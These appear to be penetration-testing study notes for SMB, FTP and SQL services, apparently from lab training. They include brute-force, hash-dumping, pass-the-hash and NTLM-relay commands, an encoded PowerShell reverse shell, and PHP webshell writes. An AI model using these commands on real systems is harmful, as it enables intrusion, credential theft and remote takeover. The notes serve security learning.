
# Interacting with SMB
---
- SMB (Server Message Block)

## Windows CMD

**dir** lists the directories files and sub-directories
```cmd
dir \\192.168.220.129\Finance\
```

can also find how many files are in the shared folder and their sub-directories
```cmd
dir n: /a-d /s /b | find /c ":\"
```

can be used with wildcards to search with criteria
```cmd
dir n:\*cred* /s /b
```

**net use** connects a computer to or disconnects a computer from a shared resource or displays information about computer connections.
```cmd
net use n: \\192.168.220.129\Finance
```

can also be used with user/pass authentication
```cmd
net use n: \\192.168.220.129\Finance /user:plaintext Password123
```

**findstr** can be used to search for a specific word within files
```cmd
findstr /s /i cred n:\*.*
```

## Windows PowerShell

**Get-ChildItem** is the PowerShell equivalent of dir
```powershell
Get-ChildItem \\192.168.220.129\Finance\
```

can also be used to find how many files are in the shared folder and their sub-directories
```powershell
(Get-ChildItem -File -Recurse | Measure-Object).Count
```

**-Include** can be used to search for specific files
```powershell
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

**Select-String** is the PowerShell equivalent of grep or findstr, using regular expressions to search for text patterns in files
```powershell
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

**New-PSDrive** is the PowerShell equivalent of net use
```powershell
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
```

New-PSDrive can be used with credentials using a **PSCredential** object.
```powershell
$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```

## Linux

**mount** command can be used to mount fileshare with user/pass authentication
```shell
sudo mkdir /mnt/Finance
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

can also use a credential file
```shell
mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

structured like this
```txt
username=plaintext
password=Password123
domain=.
```

**Find** can be used to look for files with names containing strings
```shell
find /mnt/Finance/ -name *cred*
```

**grep** can then be used to to search the file
```shell
grep -rn /mnt/Finance/ -ie cred
```

# Interacting with Databases

connect to a **MSSQL** database
```cmd
sqlcmd -S 10.129.20.13 -U username -P Password123
```

connect to a MySQL database in **Linux**
```shell
mysql -u username -pPassword123 -h 10.129.20.13
```

connect to a MySQL database in **Windows**
```cmd
mysql.exe -u username -pPassword123 -h 10.129.20.13
```

# Attacking FTP

## Enumeration

**nmap** enumeration
```shell
sudo nmap -sC -sV -p 21 192.168.2.142 
```

anonymous login
```shell
ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

bruteforce with **hydra**
```shell
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.11.214
```

bruteforce with **medusa**
```shell
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```

**FTP bounce** attack with nmap
```shell
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

**CoreFTP** attack allows arbitrary file write on the target system
```shell
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

# Attacking SMB

## Enumeration

TCP port scan with **nmap**
```shell
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

UDP port scan with nmap
```shell
sudo nmap 10.129.14.128 -sV -sC -sU -p137,138
```

**smbclient** can be used to list the shares
```shell
smbclient -N -L //10.129.14.128
```

**smbmap** will do the same, but also list the permissions of the folder
```shell
smbmap -H 10.129.14.128 -r notes
```

smbmap can also download
```shell
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

and upload files to/from the share
```shell
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

both can be done authenticated
```shell
smbmap -u jason -p '34c8zuNBo91!@28Bszh' -H 10.129.203.6 --download "GGJ\id_rsa"
```

**rpcclient** can be used to enumerate SMB and gather information such as usernames
```shell-session
rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers
```

**enum4linux** will utilise **nmblookup**, **net**, **rpcclient**, and **smbclient** to automate SMB enumeration
```shell-session
./enum4linux-ng.py 10.10.11.45 -A -C
```

can bruteforce SMB credentials with **crackmapexec**
```shell
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

crackmapexec can also be used to login to the host, and run commands
```shell
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

**impacket** can login to the host 
```shell
impacket-psexec administrator:'Password123!'@10.10.110.17
```

enumerate logged on users
```shell
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

dump **SAM** hashes
```shell
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

use **Pass The Hash (PtH)** to authorise
```shell
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

**responder** can be used to perform a **Fake Authorisation** attack, also known as **LLMNR Poisoning**
```shell
sudo responder -I ens33
```

the captured credentials can then be cracked using **hashcat**
```shell
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

if the hash cant be cracked, there are other options. first smb needs to be disabled in the responder config
```shell
cat /etc/responder/Responder.conf | grep 'SMB ='
```

the SAM hash can be relayed, poisoned and then used to execute commands like reverse shells
```shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```
# Attacking SQL Databases

## Enumeration

MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port

use **nmap** to grab the service's banner
```shell
nmap -Pn -sV -sC -p1433 10.10.10.125
```

connect to mysql server
```shell
mysql -u julio -pPassword123 -h 10.129.20.13
```

to connect remotely, can use impacket's **msqlclient**
```shell
mssqlclient.py -p 1433 julio@10.129.203.7 
```

or sqsh
```shell
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

which can also use windows authentication
```shell
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

mysql show databases
```shell
mysql> SHOW DATABASES;
```

select a database
```shell
mysql> USE htbusers;
```

list tables
```shell
mysql> SHOW TABLES;
```

select from specific table
```shell
mysql> SELECT * FROM users;
```

mssql run commands using **xp_cmdshell**
```cmd
1> xp_cmdshell 'whoami'
2> GO
```

mysql local file write
```shell
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

mssql write file
```cmd
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

mssql read local file
```cmd
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

mysql read local file
```shell
mysql> select LOAD_FILE("/etc/passwd");
```

